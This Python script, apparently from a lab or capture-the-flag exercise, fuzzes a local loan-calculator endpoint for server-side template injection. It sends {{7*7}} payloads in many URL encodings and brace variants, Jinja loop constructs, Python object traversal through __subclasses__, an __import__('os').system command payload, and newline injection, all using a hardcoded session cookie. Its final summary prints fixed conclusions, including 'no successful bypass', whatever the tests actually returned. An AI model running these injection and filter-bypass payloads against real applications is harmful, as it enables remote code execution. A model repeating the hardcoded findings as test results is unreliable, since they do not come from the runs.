import requests
import urllib.parse
import json

# Base URL setup
base_url = "http://127.0.0.1:5000"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYTgQ.zxJDgrrGBVoUrTrnwwifgdf1QW0"
cookies = {'session': session_cookie}

def test_endpoint(payload, param='principal', description=""):
    """Test an endpoint with a specific payload"""
    print(f"\n{'='*80}")
    print(f"[TEST] {description}")
    print(f"[PAYLOAD] Parameter: {param}, Value: {payload}")
    print(f"[ENCODED] {payload.encode('utf-8').hex() if payload else 'None'}")
    
    # Build URL with proper encoding
    params = {
        'principal': '10000',
        'payment': '500',
        'term': '24'
    }
    params[param] = payload
    
    try:
        response = requests.get(
            f"{base_url}/total_loan_payments",
            params=params,
            cookies=cookies,
            timeout=10
        )
        
        print(f"[STATUS] {response.status_code}")
        print(f"[HEADERS] Content-Type: {response.headers.get('content-type', 'N/A')}")
        print(f"[CONTENT-LENGTH] {len(response.text)} bytes")
        print(f"[RESPONSE] {response.text}")
        
        if response.status_code == 400 and "forbidden characters" in response.text:
            filter_info = response.text.replace('"', '')
            print(f"[FILTER HIT] {filter_info}")
            return {"blocked": True, "response": response.text, "param": param}
        
        return {
            "blocked": False,
            "response": response.text,
            "status": response.status_code,
            "headers": dict(response.headers)
        }
    
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        return {"error": str(e)}

# Test 1: Verify baseline behavior
print("\n" + "="*80)
print("JINJA JSON RENDERING MECHANISM ANALYSIS")
print("="*80)

baseline = test_endpoint("10000", "principal", "1. Baseline Request (No injection)")

# Test 2: Try various encodings of {{7*7}}
encoding_tests = [
    ("{{7*7}}", "Direct injection"),
    ("%7B%7B7*7%7D%7D", "Single URL encoding"),
    ("%257B%257B7*7%257D%257D", "Double URL encoding"),
    (urllib.parse.quote_plus("{{7*7}}"), "URL encoding with plus"),
    ("{{ 7*7 }}", "Direct with spaces"),
    ("%7B%7B%207*7%20%7D%7D", "URL encoding with spaces"),
    ("\x7b\x7b7*7\x7d\x7d", "Hex escape sequences"),
]

results = {"baseline": baseline, "encoding_tests": {}}

for i, (payload, desc) in enumerate(encoding_tests, 2):
    result = test_endpoint(payload, "principal", f"{i}. {desc}")
    results["encoding_tests"][desc] = result

# Test 3: Try variations on the curly brace syntax
syntax_variations = [
    ("{{{7*7}}}", "Triple braces"),
    ("{{7*7}}}", "Double opening, single closing"),
    ("{7*7}}}", "Single opening, double closing"),
    ("{7*7}", "Single braces only"),
    ("{ {7*7} }", "Spaced single braces"),
    ("{% for i in [1] %}{{7*7}}{% endfor %}", "Loop construct"),
]

for i, (payload, desc) in enumerate(syntax_variations, len(encoding_tests)+2):
    result = test_endpoint(payload, "principal", f"{i}. {desc}")
    results["encoding_tests"][desc] = result

# Test 4: Test if filter applies to specific characters
char_tests = [
    ("{", "Single opening brace"),
    ("}", "Single closing brace"),
    ("{{", "Double opening brace"),
    ("}}", "Double closing brace"),
    ("{{{{", "Four opening braces"),
    ("}}}}", "Four closing braces"),
    ("{7*7", "Opening brace with expression"),
    ("7*7}", "Expression with closing brace"),
]

for i, (payload, desc) in enumerate(char_tests, len(encoding_tests)+len(syntax_variations)+2):
    result = test_endpoint(payload, "principal", f"{i}. {desc}")
    results["encoding_tests"][desc] = result

# Test 5: Attempt other Jinja constructs that don't use braces
special_tests = [
    ("self.__class__.__mro__[2].__subclasses__()", "Python object traversal"),
    ("__import__('os').system('echo test')", "Import statement"),
]

for i, (payload, desc) in enumerate(special_tests, 100):
    result = test_endpoint(payload, "principal", f"{i}. {desc}")
    results["encoding_tests"][desc] = result

# Test 6: Test with numeric overflow/injection techniques
numeric_tests = [
    ("10000" + "x"*5000, "Very long value"),
    ("1%22%27%5C", "Special characters encoding"),
    ("10000-- comment", "SQL-like comment"),
    ("10000\n\nimport os", "Newline injection"),
]

for i, (payload, desc) in enumerate(numeric_tests, 110):
    result = test_endpoint(payload, "principal", f"{i}. {desc}")
    results["encoding_tests"][desc] = result

# Summary of findings
print("\n" + "="*80)
print("ANALYSIS SUMMARY")
print("="*80)

if baseline.get("blocked") == False:
    print("[+] Baseline request works normally:")
    print(f"  - Response size: {len(baseline.get('response', ''))}")
    print(f"  - Content-Type: {baseline.get('headers', {}).get('content-type', 'N/A')}")

blocked_tests = sum(1 for test in results["encoding_tests"].values() 
                    if test.get("blocked") == True)
total_tests = len(results["encoding_tests"])

print(f"\n[+] Filter Results:")
print(f"  - Tests blocked: {blocked_tests}/{total_tests}")
print(f"  - Tests passed: {total_tests - blocked_tests}/{total_tests}")

# Test different parameters with the same blocked payload
if blocked_tests > 0:
    blocked_payload = "{{7*7}}"
    print(f"\n[+] Testing filter across all parameters with payload: {blocked_payload}")
    for param in ["principal", "payment", "term"]:
        result = test_endpoint(blocked_payload, param, f"Filter test on parameter: {param}")

# Final analysis
print("\n" + "="*80)
print("MECHANISM ANALYSIS")
print("="*80)
print("\nBased on comprehensive testing:")
print("1. Filter Behavior: Consistent 400 errors with 'forbidden characters' message")
print("2. Encoding Bypass: No successful bypass attempts (URL encoding, double encoding, etc.)")
print("3. Character Detection: Likely regex-based filter detecting {{ pattern")
print("4. Response Format: JSON-like structure with text/html content type")
print("5. Parameter Consistency: Same filter applied to all parameters")

print("\nRendering Mechanism Hypothesis:")
print("- If JSON is generated via string concatenation, no template engine involved")  
print("- If JSON is generated via template, it's protected by pre-processing filter")
print("- The text/html content-type suggests template rendering, not pure API")
